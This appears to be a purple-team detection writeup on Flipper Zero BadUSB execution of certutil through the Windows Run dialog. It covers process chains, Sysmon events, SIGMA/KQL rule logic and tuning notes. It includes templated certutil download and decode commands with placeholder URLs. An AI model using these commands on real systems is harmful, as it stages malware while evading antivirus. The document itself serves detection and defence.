## 04 - LOLBIN Execution via certutil (Windows Run Dialog)

### Attack overview

The Flipper Zero sends WIN+R to open the Windows Run dialog, types a cmd command
that invokes certutil with download or decode flags, and presses Enter. Certutil is
a signed Windows binary present on every Windows installation -- no payload is dropped
that would be flagged by AV, and no PowerShell is involved.

The two realistic execution paths:

- `cmd /c certutil -urlcache -split -f <url> <output>` -- downloads a file from a URL
- `cmd /c certutil -decode <encoded> <output>` -- decodes a pre-staged base64 payload

Both paths result in explorer.exe spawning cmd.exe, which spawns certutil.exe. The
explorer.exe parent is the key artifact that distinguishes Run dialog execution from
certutil use in other contexts (scripts, installers, interactive terminals).

MITRE ATT&CK:
- T1105 - Ingress Tool Transfer
- T1027 - Obfuscated Files or Information
- T1200 - Hardware Additions

### Forensic artifacts generated

#### Process creation chain

```
explorer.exe (Run dialog)
  -> cmd.exe /c certutil -urlcache -split -f <url> <output>
    -> certutil.exe -urlcache -split -f <url> <output>
```

Sysmon Event ID 1 fires for both cmd.exe and certutil.exe. The critical field is
`ParentImage` on cmd.exe pointing to `explorer.exe` -- this is the Run dialog signal.

| Field | Value |
|-------|-------|
| `Image` | `C:\Windows\System32\certutil.exe` |
| `ParentImage` | `C:\Windows\System32\cmd.exe` |
| `CommandLine` | `certutil -urlcache -split -f <url> <output>` |
| Grandparent (cmd.exe `ParentImage`) | `C:\Windows\explorer.exe` |

#### Network connection

Sysmon Event ID 3 fires on certutil.exe making an outbound connection when using
`-urlcache`. Fields: `Image = certutil.exe`, `DestinationIp`, `DestinationPort = 80/443`.

#### File system artifact

Sysmon Event ID 11 fires when certutil writes the downloaded file. The staging
location (temp directory or current working directory) and the file name are logged.

#### Windows Security log

Event ID 4688 (process creation with command line auditing enabled):
- `New Process Name`: `certutil.exe`
- `Creator Process Name`: `cmd.exe`
- `Process Command Line`: full certutil invocation visible

### Detection rules

#### SIGMA

File: `sigma/win_badusb_lolbin_certutil_run_dialog.yml`

Logic: process_creation where either certutil.exe has explorer.exe as direct parent
with download/decode flags, or cmd.exe has explorer.exe as parent with certutil in
the command line and download/decode flags. Filters known installer patterns.

Severity: high

Differentiation from existing certutil rules: existing rules (proc_creation_win_certutil_download,
proc_creation_win_certutil_decode) detect certutil generically without a parent
process constraint. This rule is scoped specifically to the Run dialog execution
context (explorer.exe parent).

#### KQL

File: `kql/BadUSBCertutilLOLBIN.kql`

Data source: DeviceProcessEvents (Microsoft Defender for Endpoint)

### Purple team exercise

1. Deploy Sysmon on the test machine with process creation and network connection logging
2. Plug in the Flipper Zero, select the payload, press OK
3. Observe cmd.exe and certutil.exe spawn with explorer.exe in the parent chain
4. Verify Sysmon Event ID 1 for cmd.exe shows ParentImage = explorer.exe
5. Verify Sysmon Event ID 3 for certutil.exe shows outbound connection (if using urlcache)
6. Confirm SIGMA rule fires on the cmd.exe event (ParentImage + certutil + urlcache)

### Tuning notes

High false positive sources:
- Software update mechanisms that use certutil for certificate validation via Run
- IT admin workflows using Run dialog for quick certutil operations

Reduce false positives by:
- Correlating with a USB HID device registration event within the preceding 5 seconds
- Restricting to specific certutil flags (-urlcache, -decode) rather than any certutil invocation
- Excluding known admin workstations or accounts from the scope

### References

- LOLBAS: certutil - https://lolbas-project.github.io/lolbas/Binaries/Certutil/
- MITRE T1105 - https://attack.mitre.org/techniques/T1105/
- MITRE T1027 - https://attack.mitre.org/techniques/T1027/
- Flipper Zero BadUSB documentation - https://docs.flipper.net/bad-usb
- Sysmon configuration - https://github.com/SwiftOnSecurity/sysmon-config
